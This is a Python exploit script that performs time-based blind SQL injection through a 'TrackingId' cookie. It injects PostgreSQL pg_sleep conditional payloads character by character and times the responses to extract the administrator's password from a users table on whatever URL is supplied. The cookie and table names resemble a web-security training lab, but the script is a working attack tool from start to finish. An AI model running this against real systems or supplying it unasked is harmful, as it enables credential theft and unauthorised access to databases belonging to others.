import sys
import requests
import string 
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} domain")
    sys.exit(1)

URL = sys.argv[1]

dic = string.ascii_letters+string.digits
response = requests.get(URL)
tracking_id = response.cookies["TrackingId"]
sess_cookie = response.cookies["session"]

def password(url):
    
    pwd = ""
    i = 1
    while(True):
        found_char = False
        print(f"Index : {i}")
        for d in dic:
            payload = tracking_id + "'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "+str(i)+", 1) = '" +d+"') THEN pg_sleep(5) ELSE NULL END)--"
            #print("payload",payload)
            start = time.time()
            response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            end = time.time()

            delay = end-start
            if delay>=5:
                pwd += d
                print(pwd)
                found_char = True
                break
            time.sleep(1)
        i+=1
    
        if not found_char:
            print("Password : ",pwd)
            break

password(URL)
